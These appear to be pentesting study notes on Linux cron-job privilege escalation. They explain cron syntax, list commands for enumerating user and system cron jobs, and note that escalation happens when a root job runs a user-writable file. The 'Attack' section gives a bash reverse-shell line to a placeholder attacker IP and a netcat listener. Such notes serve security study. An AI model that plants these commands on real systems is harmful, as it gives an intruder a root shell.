### Introduction
Cronjobs are Linux's ***scheduled tasks***. They are generally used to ***automate administrative and maintenance tasks*** and can be set up by low-level users to automate day-to-day time-consuming tasks.

**Example**
`7 * 8 * * /tmp/script.sh`

This means `script.sh` from folder `tmp` will be ***executed at the seventh minute of every hour on the eighth day of each month***.

For system-wide tasks, the cron tables are read from `/etc/crontab.` 

### Privilege Escalation
Privilege escalation are generally happen when a ***root cronjob runs a file that low-level users can edit***. 

### List Cronjobs
**For the current user**
```bash
crontab -l
```

**For a specific user (as root)**
```
crontab -u <username> -l
```

**System-wide cron jobs**
```
cat /etc/crontab
ls /etc/cron.d/
ls /etc/cron.daily/
ls /etc/cron.hourly/
ls /etc/cron.weekly/
ls /etc/cron.monthly/
```

### Attack
**Modify the script to get a reverse shell**
```bash
#!/bin/bash
bash -i >& /dev/tcp/<kali_ip>/<port> 0>&1
```

**On attacker machine, start a listener**
```
nc -nvlp <port>
```